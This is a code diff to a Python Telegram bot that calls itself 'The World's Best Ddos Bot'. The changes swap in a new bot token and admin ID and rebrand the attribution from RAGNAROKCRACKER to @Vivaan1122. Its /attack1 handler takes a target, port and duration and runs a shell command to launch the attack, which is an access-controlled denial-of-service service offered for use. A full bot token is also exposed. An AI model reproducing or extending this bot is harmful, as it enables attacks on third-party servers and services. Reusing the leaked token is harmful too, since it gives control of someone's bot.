@@ -8,10 +8,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot tokSasen here
-bot = telebot.TeleBot('7238502739:AAHUs-v5Cswjoi3wcfB_OjLTg')
+bot = telebot.TeleBot('7631700769:AAFkRGd9Zl6vUUNHCmN6CWeikPx25q7d3o0')
 
 # Admin user IDs
-admin_id = ["5599402910"]
+admin_id = ["6501926425"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY HELLA.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/RAGNAROKCRACKER"
+    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY HELLA.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy @Vivaan1122"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /attack1 command
@@ -249,9 +249,9 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"RAGNAROK 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/RAGNAROKCRACKER"
         else:
-            response = "Usage :- /attack1 <target> <port> <time>\nBy https://t.me/RAGNAROKCRACKER"  # Updated command syntax
+            response = "Usage :- /attack1 <target> <port> <time>\nBy @Vivaan1122"  # Updated command syntax
     else:
-        response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @RAGNAROKCRACKER"
+        response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @Vivaan1122"
 
     bot.reply_to(message, response)
 
@@ -303,7 +303,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy https://t.me/RAGNAROKCRACKER"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @Vivaan1122"
     bot.reply_to(message, response)
 
 
